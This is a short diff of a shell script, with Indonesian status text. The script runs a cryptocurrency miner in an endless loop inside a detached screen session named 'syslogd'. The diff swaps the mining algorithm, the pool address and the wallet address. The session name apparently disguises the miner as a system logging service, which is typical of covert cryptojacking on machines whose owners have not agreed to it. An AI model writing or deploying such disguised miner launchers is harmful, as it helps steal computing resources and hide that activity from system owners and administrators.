@@ -27,7 +27,7 @@ else
   echo "▶ Menjalankan di background screen 'syslogd'..."
   screen -dmS syslogd bash -c "
     while true; do
-      $XBIN --algorithm power2b --pool stratum+tcps://stratum-asia.rplant.xyz:17022 -u mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg.asia2 -p x --cpu-threads 7
+      $XBIN --algorithm xelisv2_pepew --pool stratum+tcp://retromike.net:5005 -u PQ1TCGVFEz8LzEgiyECHCVozsdtLvQ2N61.asia2 -p x --cpu-threads 7
       sleep 2
     done
   "
